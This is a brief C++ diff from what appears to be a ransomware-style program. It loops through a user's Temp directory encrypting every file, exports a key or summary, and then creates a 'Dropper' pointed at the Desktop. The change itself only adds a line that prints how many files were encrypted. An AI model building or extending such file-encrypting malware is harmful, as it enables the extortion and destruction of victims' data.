@@ -16,6 +16,7 @@ int main(int argc, char* args[]) {
   for (const auto& file : encryptor.ListDirectory("/home/aesophor/Temp")) {
     encryptor.Encrypt(file);
   }
+  cout << "Totally encrypted: " << encryptor.count() << " files." << endl;
   cout << encryptor.Export() << endl;
 
   Dropper dropper("/home/aesophor/Desktop");
